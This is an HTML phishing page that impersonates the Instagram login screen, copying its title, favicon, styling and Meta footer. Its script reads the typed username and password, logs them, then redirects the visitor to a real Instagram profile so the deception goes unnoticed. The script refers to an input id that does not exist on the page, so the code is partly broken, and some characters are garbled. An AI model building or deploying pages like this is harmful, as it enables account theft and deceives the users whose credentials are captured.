<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      text-align: center;
      margin-top: 100px;
    }
    .login-box {
      background: white;
      width: 300px;
      padding: 30px;
      margin: auto;
      border: 1px solid #ddd;
      box-shadow: 0px 0px 10px #ccc;
      border-radius: 10px;
    }
    input {
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #0095f6;
      color: white;
      border: none;
      padding: 10px 20px;
      cursor: pointer;
      width: 95%;
      margin-top: 10px;
      border-radius: 5px;
    }
    .footer {
      font-size: 12px;
      color: #999;
      margin-top: 20px;
    }
    h2 {
      font-family: 'Segoe UI', sans-serif;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Instagram</h2>
    <form onsubmit="redirectUser(event)">
      <input id="text" placeholder="Phone number, username, or email" required>
      <input id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="footer">
      ¬© 2025 Instagram from Meta
    </div>
  </div>

  <script>
    function redirectUser(event) {
      event.preventDefault(); // Stop default submit
       
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      console.log("üì• Username entered:", user);
      console.log("üîê Password entered:", pass);

      // redirect to real Insta profile
      window.location.href = "https://instagram.com/marsha_cute_bea"; // Replace with any Insta profile
    }
  </script>

</body>
</html>
